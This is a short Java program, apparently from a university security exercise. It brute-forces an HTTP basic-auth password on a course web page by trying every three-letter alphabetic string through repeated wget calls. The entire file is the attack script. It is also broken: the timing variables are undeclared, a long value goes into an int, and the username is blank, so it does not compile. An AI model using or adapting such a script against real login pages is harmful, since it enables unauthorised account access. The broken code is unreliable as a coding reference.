
import java.io.*;
import java.util.*;


class BruteForce{

public static void main(String args[]){

String pass,s;
char a,b,c;
int z=0;
int attempt=0;
Process p;


char password[]={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q',
            'R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h',
            'i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};
 z = System.currentTimeMillis();
int at=0;
for(int i=0;i<password.length;i++){
 for(int j=0;j<password.length;j++){
  for(int k=0;k<password.length;k++){
      pass=String.valueOf(password[i])+String.valueOf(password[j])+String.valueOf(password[k]);

     try {
          System.out.println("Trying  crack using: "+pass);
          at++;


          p = Runtime.getRuntime().exec("wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php");
          try{
          p.waitFor();
         }
      catch(Exception q){}


          z = p.exitValue();


      if(z==0)
      {
       finish = System.currentTimeMillis();
      float time = finish - t;
      System.out.println("PASSWORD CRACKED:"+ pass + " in " + at + " attempts " );
      System.out.println("PASSWORD CRACKED:"+ pass + " in " + time + " milliseconds " );
      System.exit(0);
      }

      }
     catch (IOException e) {
        System.out.println("Exception happened");
        e.printStackTrace();
        System.exit(-1);
                           }

        }
       }
      }
    }
  }


